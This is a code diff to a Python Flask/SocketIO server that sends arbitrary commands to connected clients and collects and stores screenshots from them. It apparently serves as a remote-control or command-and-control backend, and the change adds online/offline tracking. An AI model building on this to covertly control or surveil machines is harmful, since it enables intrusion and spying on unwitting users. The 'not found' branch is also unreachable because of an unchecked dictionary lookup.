@@ -10,11 +10,13 @@ clients = {}
 
 
 def emit_command_to_client(ip, command):
-    for sid, client_ip in clients.items():
-        if client_ip == ip:
-            socketio.emit('command', {'command': command}, room=sid)
-            return jsonify({'status': 'success', 'message': f'Command {command} sent to client {ip}.'}), 200
-    return jsonify({'status': 'error', 'message': f'Client {ip} not found.'}), 200
+    if clients[ip]['status'] == 'online':
+        socketio.emit('command', {'command': command}, room=clients[ip]['sid'])
+        return jsonify({'status': 'success', 'message': f'Command {command} sent to client {ip}.'}), 200
+    elif clients[ip]['status'] == 'offline':
+        return jsonify({'status': 'error', 'message': f'**🔴 Client {ip} is offline.**'}), 200
+    else:
+        return jsonify({'status': 'error', 'message': f'Client {ip} not found.'}), 200
 
 
 @app.route('/api/v1/command', methods=['POST'])
@@ -30,7 +32,14 @@ def handle_command():
 
 @app.route('/api/v1/clients', methods=['GET'])
 def get_clients():
-    clients_info = [{'name': f'Client {i + 1}', 'ip': ip} for i, ip in enumerate(clients.values())]
+    status_filter = request.args.get('status')
+    if status_filter:
+        filtered_clients = {ip: data for ip, data in clients.items() if data['status'] == status_filter}
+    else:
+        filtered_clients = clients
+
+    clients_info = [{'name': f'Client {i + 1}', 'ip': ip, 'status': data['status']}
+                    for i, (ip, data) in enumerate(filtered_clients.items())]
     return jsonify({'status': 'success', 'clients': clients_info}), 200
 
 
@@ -43,8 +52,7 @@ def list_screenshots(directory):
 
 @app.route('/api/v1/screenshot', methods=['GET'])
 def get_screenshots():
-    screenshots = [screenshot for client_ip in clients.values() for screenshot in
-                   list_screenshots(f"screenshots/{client_ip}")]
+    screenshots = [screenshot for ip in clients.keys() for screenshot in list_screenshots(f"screenshots/{ip}")]
     return jsonify(
         {'status': 'success', 'screenshots': screenshots if screenshots else "No screenshots available."}), 200
 
@@ -67,13 +75,22 @@ def get_screenshot(ip, screenshot):
 
 @socketio.on('connect')
 def handle_connect():
-    clients[request.sid] = request.headers.get('X-Forwarded-For', request.remote_addr)
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    clients[client_ip] = {'sid': request.sid, 'status': 'online'}
+    print(f"Client {client_ip} connected and is now online.")
 
 
 @socketio.on('screenshot_response')
 def handle_screenshot(data):
     screenshot_bytes = base64.b64decode(data.get('screenshot'))
-    client_ip = clients.get(request.sid)
+    client_ip = None
+    for ip, client_data in clients.items():
+        if client_data['sid'] == request.sid:
+            client_ip = ip
+            break
+    if not client_ip:
+        print("Client not found.")
+        return
     screenshot_dir = f"screenshots/{client_ip}"
     os.makedirs(screenshot_dir, exist_ok=True)
     screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
@@ -83,7 +100,14 @@ def handle_screenshot(data):
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    print(f"Client {clients[request.sid]} disconnected.")
+    client_ip = None
+    for ip, data in clients.items():
+        if data['sid'] == request.sid:
+            client_ip = ip
+            break
+    if client_ip:
+        clients[client_ip]['status'] = 'offline'
+        print(f"Client {client_ip} disconnected and is now offline.")
 
 
 if __name__ == '__main__':
